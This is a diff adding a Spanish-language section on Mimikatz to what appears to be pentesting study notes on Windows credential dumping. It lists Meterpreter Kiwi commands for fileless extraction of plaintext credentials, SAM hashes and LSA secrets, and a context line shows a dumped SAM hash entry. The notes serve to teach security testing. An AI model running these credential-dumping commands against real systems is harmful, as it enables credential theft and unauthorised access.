@@ -50,7 +50,17 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 #### `Mimikatz`
 
+Mimikatz es una herramienta de post-explotación de Windows que permite extraer credenciales en texto plano de la memoria y hashes de contraseñas de las bases de datos SAM locales, entre otros datos.
 
+Podemos utilizar el ejecutable de Mimikatz o, si tenemos acceso a una sesión Meterpreter en un objetivo Windows, podemos utilizar la extensión integrada Kiwi de Meterpreter, que permite ejecutar Mimikatz dinámicamente en el sistema objetivo sin escribirlo en el disco, lo que se conoce como ejecución fileless.
+
+```bash
+meterpreter > load kiwi
+meterpreter > creds_all        # Obtiene todas las credenciales
+meterpreter > lsa_dump_sam     # Obtiene hashes de cuentas locales de la SAM
+meterpreter > lsa_dump_secrets # Obtiene secretos almacenados por LSA
+meterpreter > 
+```
 
 ### Cracking de hashes NTLM
 
